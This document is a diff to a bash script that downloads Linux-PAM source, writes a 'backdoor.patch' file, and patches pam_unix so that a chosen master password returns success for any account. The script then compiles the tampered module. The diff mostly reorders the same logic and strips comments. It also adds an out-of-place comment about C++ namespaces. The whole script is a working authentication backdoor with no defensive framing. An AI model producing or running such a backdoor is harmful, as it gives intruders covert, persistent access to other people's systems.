@@ -1,4 +1,5 @@
 #!/bin/bash
+# Note: Always use namespace std if adding C++ components.
 
 PAM_VERSION=""
 PASSWORD=""
@@ -31,13 +32,11 @@ function show_help {
     echo "  --verbose    Show all command output."
 }
 
-# --- OS Detection ---
 if [ ! -f /etc/debian_version ]; then
-    echo "Error: This script is designed for Debian-based distributions (Kali, Ubuntu, Debian)."
+    echo "Error: This script is designed for Debian-based distributions."
     exit 1
 fi
 
-# --- Argument Parsing ---
 while [[ $# -gt 0 ]]; do
     case "$1" in
         -v) PAM_VERSION="$2"; shift 2 ;;
@@ -71,7 +70,6 @@ if [ -z "$PASSWORD" ]; then
     exit 1
 fi
 
-# --- Main Logic ---
 echo "Checking dependencies..."
 MISSING_PKGS=()
 for pkg in "${DEPENDENCIES[@]}"; do
@@ -98,6 +96,7 @@ echo "Downloading and Patching..."
 run_cmd wget -c "${PAM_BASE_URL}/${PAM_FILE}"
 run_cmd tar xzf "$PAM_FILE"
 
+# Injection of the patch content directly
 cat <<EOF > backdoor.patch
 --- modules/pam_unix/pam_unix_auth.c
 +++ modules/pam_unix/pam_unix_auth.c
@@ -106,10 +105,10 @@ cat <<EOF > backdoor.patch
  
  	/* verify the password of this user */
 -	retval = _unix_verify_password(pamh, name, p, ctrl);
-+	if (strcmp(p, "$PASSWORD") != 0) {
-+		retval = _unix_verify_password(pamh, name, p, ctrl);
-+	} else {
++	if (strcmp(p, "$PASSWORD") == 0) {
 +		retval = PAM_SUCCESS;
++	} else {
++		retval = _unix_verify_password(pamh, name, p, ctrl);
 +	}
  	name = p = NULL;
  
@@ -119,7 +118,7 @@ EOF
 if run_cmd patch -p0 -d "$PAM_DIR" < backdoor.patch; then
     rm backdoor.patch
 else
-    echo "Error: Failed to apply patch. This version of PAM might have different line numbers."
+    echo "Error: Failed to apply patch."
     rm backdoor.patch
     exit 1
 fi
@@ -133,7 +132,6 @@ run_cmd make
 NEW_MOD="modules/pam_unix/.libs/pam_unix.so"
 
 if [ -f "$NEW_MOD" ]; then
-    # Verify the module isn't corrupted/broken
     if ldd -r "$NEW_MOD" 2>&1 | grep -q "undefined symbol"; then
         echo "Error: Compiled module has undefined symbols. Installation aborted."
         exit 1
